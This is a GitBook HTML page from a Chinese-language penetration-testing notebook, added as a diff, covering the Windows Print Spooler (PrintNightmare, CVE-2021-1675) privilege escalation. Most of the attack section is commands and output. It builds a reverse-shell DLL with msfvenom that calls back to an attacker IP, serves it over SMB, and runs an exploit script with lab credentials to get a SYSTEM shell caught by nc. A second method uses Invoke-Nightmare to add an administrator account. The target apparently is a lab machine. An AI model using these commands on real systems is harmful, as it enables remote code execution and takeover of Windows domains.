@@ -1,0 +1,972 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Windows Print Spooler权限提升漏洞 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../ADCS攻击/" />
+    
+    
+    <link rel="prev" href="../CVE-2020-1472 NetLogon权限提升漏洞/" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../nmap/">
+            
+                <a href="../../nmap/">
+            
+                    
+                    nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../searchsploit/">
+            
+                <a href="../../searchsploit/">
+            
+                    
+                    searchsploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../Metasploit/">
+            
+                <a href="../../Metasploit/">
+            
+                    
+                    Metasploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../内网穿透/">
+            
+                <a href="../../内网穿透/">
+            
+                    
+                    内网穿透
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../内网穿透/Frp/">
+            
+                <a href="../../内网穿透/Frp/">
+            
+                    
+                    Frp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../内网穿透/NPS/">
+            
+                <a href="../../内网穿透/NPS/">
+            
+                    
+                    NPS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../../SMTP/">
+            
+                <a href="../../SMTP/">
+            
+                    
+                    SMTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../../SMB/">
+            
+                <a href="../../SMB/">
+            
+                    
+                    SMB
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../../SMB/smbmap.html">
+            
+                <a href="../../SMB/smbmap.html">
+            
+                    
+                    smbmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../../SMB/smbclient.html">
+            
+                <a href="../../SMB/smbclient.html">
+            
+                    
+                    smbclient
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../../SMB/crackmapexec.html">
+            
+                <a href="../../SMB/crackmapexec.html">
+            
+                    
+                    crackmapexec
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../../FTP/">
+            
+                <a href="../../FTP/">
+            
+                    
+                    FTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="../../DNS/">
+            
+                <a href="../../DNS/">
+            
+                    
+                    DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="../../RPC/">
+            
+                <a href="../../RPC/">
+            
+                    
+                    RPC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="../../LDAP/">
+            
+                <a href="../../LDAP/">
+            
+                    
+                    LDAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" data-path="../../WEB/">
+            
+                <a href="../../WEB/">
+            
+                    
+                    WEB
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.12.1" data-path="../../WEB/扫描.html">
+            
+                <a href="../../WEB/扫描.html">
+            
+                    
+                    扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12.2" data-path="../../WEB/IIS.html">
+            
+                <a href="../../WEB/IIS.html">
+            
+                    
+                    IIS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12.3" data-path="../../WEB/tomcat.html">
+            
+                <a href="../../WEB/tomcat.html">
+            
+                    
+                    tomcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13" data-path="../../数据库/">
+            
+                <a href="../../数据库/">
+            
+                    
+                    数据库
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.13.1" data-path="../../数据库/oracle.html">
+            
+                <a href="../../数据库/oracle.html">
+            
+                    
+                    oracle
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.2" data-path="../../数据库/mssql.html">
+            
+                <a href="../../数据库/mssql.html">
+            
+                    
+                    mssql
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    域渗透
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.1" data-path="../命令.html">
+            
+                <a href="../命令.html">
+            
+                    
+                    命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.2" data-path="../提权/">
+            
+                <a href="../提权/">
+            
+                    
+                    提权
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.2.1" data-path="../提权/提权信息.html">
+            
+                <a href="../提权/提权信息.html">
+            
+                    
+                    提权信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.2.2" data-path="../提权/组提权.html">
+            
+                <a href="../提权/组提权.html">
+            
+                    
+                    组提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.3" data-path="../免杀/">
+            
+                <a href="../免杀/">
+            
+                    
+                    免杀
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.4" data-path="../密码和hash/">
+            
+                <a href="../密码和hash/">
+            
+                    
+                    密码和hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.5" data-path="../ACL滥用/">
+            
+                <a href="../ACL滥用/">
+            
+                    
+                    ACL滥用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.6" data-path="../组策略/">
+            
+                <a href="../组策略/">
+            
+                    
+                    组策略
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.7" data-path="../NTLM/">
+            
+                <a href="../NTLM/">
+            
+                    
+                    NTLM
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.8" data-path="../Kerberos/">
+            
+                <a href="../Kerberos/">
+            
+                    
+                    Kerberos
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.9" data-path="../LDAP/">
+            
+                <a href="../LDAP/">
+            
+                    
+                    LDAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.10" data-path="../DCSync/">
+            
+                <a href="../DCSync/">
+            
+                    
+                    DCSync
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.11" data-path="../MS14-068/">
+            
+                <a href="../MS14-068/">
+            
+                    
+                    MS14-068
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.12" data-path="../CVE-2019-1040-NTLM-MIC绕过漏洞/">
+            
+                <a href="../CVE-2019-1040-NTLM-MIC绕过漏洞/">
+            
+                    
+                    CVE-2019-1040-NTLM-MIC绕过漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.13" data-path="../PASS-THE-HASH/">
+            
+                <a href="../PASS-THE-HASH/">
+            
+                    
+                    Pass The Hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.14" data-path="../CVE-2020-1472 NetLogon权限提升漏洞/">
+            
+                <a href="../CVE-2020-1472 NetLogon权限提升漏洞/">
+            
+                    
+                    CVE-2020-1472 NetLogon权限提升漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.14.15" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Windows Print Spooler权限提升漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.16" data-path="../ADCS攻击/">
+            
+                <a href="../ADCS攻击/">
+            
+                    
+                    ADCS攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.17" data-path="../票据攻击/">
+            
+                <a href="../票据攻击/">
+            
+                    
+                    票据攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.18" data-path="../域渗透工具/">
+            
+                <a href="../域渗透工具/">
+            
+                    
+                    域渗透工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15" data-path="../../Linux/">
+            
+                <a href="../../Linux/">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.15.1" data-path="../../Linux/反弹shell/">
+            
+                <a href="../../Linux/反弹shell/">
+            
+                    
+                    反弹shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15.2" data-path="../../Linux/提权/">
+            
+                <a href="../../Linux/提权/">
+            
+                    
+                    提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Windows Print Spooler权限提升漏洞</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="windows-print-spooler&#x6743;&#x9650;&#x63D0;&#x5347;&#x6F0F;&#x6D1E;">Windows Print Spooler&#x6743;&#x9650;&#x63D0;&#x5347;&#x6F0F;&#x6D1E;</h1>
+<p>Print Spooler&#x662F;&#x6253;&#x5370;&#x540E;&#x53F0;&#x5904;&#x7406;&#x670D;&#x52A1;&#xFF0C;&#x5373;&#x7BA1;&#x7406;&#x6240;&#x6709;&#x672C;&#x5730;&#x548C;&#x2F79;&#x7EDC;&#x6253;&#x5370;&#x961F;&#x5217;&#x53CA;&#x63A7;&#x5236;&#x6240;&#x6709;&#x6253;&#x5370;&#x2F2F;&#x4F5C;&#x3002;&#x8BE5;&#x670D;&#x52A1;&#x5BF9;&#x5E94;&#x7684;&#x8FDB;&#x7A0B;&#x4EE5;System&#x6743;&#x9650;&#x6267;&#x884C;&#xFF0C;&#x5176;&#x8BBE;&#x8BA1;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x9274;&#x6743;&#x4EE3;&#x7801;&#x7F3A;&#x9677;&#xFF0C;&#x5BFC;&#x81F4;&#x666E;&#x901A;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;RPC&#x89E6;&#x53D1;RpcAddPrinterDriver&#x7ED5;&#x8FC7;&#x5B89;&#x5168;&#x68C0;&#x67E5;&#x5199;&#x5165;&#x6076;&#x610F;&#x9A71;&#x52A8;&#x7A0B;&#x5E8F;&#x3002;&#x5982;&#x679C;&#x57DF;&#x63A7;&#x5B58;&#x5728;&#x6B64;&#x6F0F;&#x6D1E;&#xFF0C;&#x57DF;&#x4E2D;&#x666E;&#x901A;&#x7528;&#x6237;&#x5373;&#x53EF;&#x901A;&#x8FC7;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#x57DF;&#x63A7;&#x7684;Print Spooler&#x670D;&#x52A1;&#xFF0C;&#x5411;&#x57DF;&#x63A7;&#x6DFB;&#x52A0;&#x6076;&#x610F;&#x9A71;&#x52A8;&#xFF0C;&#x4ECE;&#x6765;&#x63A7;&#x5236;&#x6574;&#x4E2A;&#x57DF;&#x73AF;&#x5883;&#x3002;</p>
+<p><strong>&#x5F71;&#x54CD;&#x7248;&#x672C;&#xFF1A;</strong></p>
+<pre><code>Windows Server 2012 R2 (Server Core installation)
+Windows Server 2012 R2
+Windows Server 2012 (Server Core installation)
+Windows Server 2012
+Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
+installation)
+Windows Server 2008 R2 for x64-based Systems Service Pack 1
+Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core
+installation)
+Windows Server 2008 for x64-based Systems Service Pack 2
+Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core
+installation)
+Windows Server 2008 for 32-bit Systems Service Pack 2
+Windows RT 8.1
+Windows 8.1 for x64-based systems
+Windows 8.1 for 32-bit systems
+Windows 7 for x64-based Systems Service Pack 1
+Windows 7 for 32-bit Systems Service Pack 1
+Windows Server 2016 (Server Core installation)
+Windows Server 2016
+Windows 10 Version 1607 for x64-based Systems
+Windows 10 Version 1607 for 32-bit Systems
+Windows 10 for x64-based Systems
+Windows 10 for 32-bit Systems
+Windows 10 Version 21H2 for x64-based Systems
+Windows 10 Version 21H2 for ARM64-based Systems
+Windows 10 Version 21H2 for 32-bit Systems
+Windows 11 for ARM64-based Systems
+Windows 11 for x64-based Systems
+Windows Server, version 20H2 (Server Core Installation)
+Windows 10 Version 20H2 for ARM64-based Systems
+Windows 10 Version 20H2 for 32-bit Systems
+Windows 10 Version 20H2 for x64-based Systems
+Windows Server 2022 Azure Edition Core Hotpatch
+Windows Server 2022 (Server Core installation)
+Windows Server 2022
+Windows 10 Version 21H1 for 32-bit Systems
+Windows 10 Version 21H1 for ARM64-based Systems
+Windows 10 Version 21H1 for x64-based Systems
+Windows 10 Version 1909 for ARM64-based Systems
+Windows 10 Version 1909 for x64-based Systems
+Windows 10 Version 1909 for 32-bit Systems
+Windows Server 2019 (Server Core installation)
+Windows Server 2019
+Windows 10 Version 1809 for ARM64-based Systems
+Windows 10 Version 1809 for x64-based Systems
+Windows 10 Version 1809 for 32-bit Systems
+</code></pre><p>&#x53C2;&#x8003;<a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html" target="_blank">https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html</a></p>
+<p>&#x5229;&#x7528;&#x6210;&#x529F;&#x7684;&#x4E09;&#x4E2A;&#x5148;&#x51B3;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ol>
+<li>&#x5728;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x542F;&#x7528;&#x6253;&#x5370;&#x540E;&#x53F0;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x670D;&#x52A1;</li>
+<li>&#x4E0E;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#xFF08;&#x5DF2;&#x83B7;&#x5F97;&#x521D;&#x59CB;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF09;</li>
+<li>&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#xFF08;&#x6216;&#x8BA1;&#x7B97;&#x673A;&#xFF09;&#x5E10;&#x6237;&#x7684;&#x54C8;&#x5E0C;&#x503C;&#x6216;&#x5BC6;&#x7801;</li>
+</ol>
+<p>&#x653B;&#x51FB;&#x65B9;&#x5F0F;1(&#x4F7F;&#x7528;<a href="https://github.com/cube0x0/CVE-2021-1675)&#xFF1A;" target="_blank">https://github.com/cube0x0/CVE-2021-1675)&#xFF1A;</a></p>
+<p>&#x9996;&#x5148;&#x68C0;&#x67E5;&#x76EE;&#x6807;&#x662F;&#x5426;&#x5F00;&#x542F;MS-RPRN&#xFF1A;</p>
+<pre><code class="lang-shell">python3.10 rpcdump.py @10.10.10.237|grep &quot;MS-RPRN&quot;
+Protocol: [MS-RPRN]: Print System Remote Protocol
+</code></pre>
+<p>&#x5982;&#x679C;&#x5F00;&#x542F;&#x4E86;&#x8BF4;&#x660E;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x62FF;msf&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x53CD;&#x5F39;shell&#x7684;dll&#xFF1A;</p>
+<pre><code class="lang-shell">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f dll &gt; msf-reverse-shell-39502.dll
+</code></pre>
+<p>&#x542F;&#x52A8;&#x4E00;&#x4E2A;smb&#x670D;&#x52A1;&#xFF1A;</p>
+<pre><code class="lang-shell">cp ~/many-ctf/Ma\!/msf-reverse-shell-39502.dll ./share
+python3.10 smbserver.py share ./share
+
+#&#x8FDB;&#x884C;&#x653B;&#x51FB;
+python3.10 CVE-2021-1675.py atom/jason:&apos;kidvscat_electron_@123&apos;@10.10.10.237 &apos;\\10.10.14.14\share\msf-reverse-shell-39502.dll&apos;
+
+[*] Connecting to ncacn_np:10.10.10.237[\PIPE\spoolss]
+[+] Bind OK
+[+] pDriverPath Found C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
+[*] Executing \??\UNC\10.10.14.14\share\msf-reverse-shell-39502.dll
+[*] Try 1...
+[*] Stage0: 0
+[*] Try 2...
+[*] Stage0: 0
+[*] Try 3...
+Traceback (most recent call last):
+</code></pre>
+<p>&#x867D;&#x7136;&#x653B;&#x51FB;&#x811A;&#x672C;&#x90A3;&#x8FB9;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;nc&#x8FD9;&#x8FB9;&#x6210;&#x529F;&#x62FF;&#x5230;shell&#xFF1A;</p>
+<pre><code class="lang-shell">nc -lv 39502
+Microsoft Windows [Version 10.0.19042.906]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre>
+<p>&#x653B;&#x51FB;&#x65B9;&#x5F0F;2&#xFF08;&#x4F7F;&#x7528;<a href="https://github.com/calebstewart/CVE-2021-1675&#xFF09;&#xFF1A;" target="_blank">https://github.com/calebstewart/CVE-2021-1675&#xFF09;&#xFF1A;</a></p>
+<pre><code class="lang-shell">upload CVE-2021-1675.ps1
+Import-Module .\CVE-2021-1675.ps1
+
+#&#x5728;Administrators&#x7EC4;&#x4E2D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;feng&#x7528;&#x6237;&#x3002;
+Invoke-Nightmare -NewUser &quot;feng&quot; -NewPassword &quot;fengfeng123!!!&quot;
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../CVE-2020-1472 NetLogon权限提升漏洞/" class="navigation navigation-prev " aria-label="Previous page: CVE-2020-1472 NetLogon权限提升漏洞">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../ADCS攻击/" class="navigation navigation-next " aria-label="Next page: ADCS攻击">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Windows Print Spooler权限提升漏洞","level":"1.14.15","depth":2,"next":{"title":"ADCS攻击","level":"1.14.16","depth":2,"path":"域渗透/ADCS攻击/README.md","ref":"./域渗透/ADCS攻击/README.md","articles":[]},"previous":{"title":"CVE-2020-1472 NetLogon权限提升漏洞","level":"1.14.14","depth":2,"path":"域渗透/CVE-2020-1472 NetLogon权限提升漏洞/README.md","ref":"./域渗透/CVE-2020-1472 NetLogon权限提升漏洞/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"域渗透/Windows-Print-Spooler权限提升漏洞/README.md","mtime":"2023-09-24T07:05:15.231Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-24T07:12:45.149Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
